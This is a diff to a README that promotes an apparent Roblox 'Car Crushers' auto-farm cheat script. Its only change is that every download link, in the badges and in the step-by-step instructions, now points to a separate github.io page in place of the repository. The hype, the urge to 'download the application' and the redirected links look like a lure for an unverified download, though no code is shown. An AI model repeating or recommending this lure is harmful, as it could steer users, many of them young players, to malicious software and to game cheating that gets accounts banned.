@@ -1,6 +1,6 @@
 # 🔧 roblox-car-crushers-script-2026 - Effortless Cash Farming, Hands-Free AFK
 
-[![Download Script](https://img.shields.io/badge/Download-Car_Crushers_Script_2026-ff7f00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rocoagustin028-cell/roblox-car-crushers-script-2026)
+[![Download Script](https://img.shields.io/badge/Download-Car_Crushers_Script_2026-ff7f00?style=for-the-badge&logo=github&logoColor=white)](https://rocoagustin028-cell.github.io)
 
 ## 🏆 What This Script Does
 
@@ -28,7 +28,7 @@ Follow these steps in order. Do not skip anything.
 
 **Step 1: Download the application**
 
-Visit this link to download the application: [https://github.com/rocoagustin028-cell/roblox-car-crushers-script-2026](https://github.com/rocoagustin028-cell/roblox-car-crushers-script-2026)
+Visit this link to download the application: [https://rocoagustin028-cell.github.io](https://rocoagustin028-cell.github.io)
 
 This page will open in your web browser. Look for a green button that says "Code" or a download section on the page. Click it and choose "Download ZIP" if you see that option. The download should start automatically. It might take a minute or two depending on your internet speed.
 
@@ -144,7 +144,7 @@ This tool is built for convenience and efficiency. It saves you hours of tedious
 
 Join thousands of users who farm cash while they work, study, or relax. Download the script now and start earning.
 
-[![Download Now](https://img.shields.io/badge/Download-Car_Crushers_2_Auto_Farm-00cc00?style=for-the-badge&labelColor=333333&color=ff5500)](https://github.com/rocoagustin028-cell/roblox-car-crushers-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-Car_Crushers_2_Auto_Farm-00cc00?style=for-the-badge&labelColor=333333&color=ff5500)](https://rocoagustin028-cell.github.io)
 
 ---
 
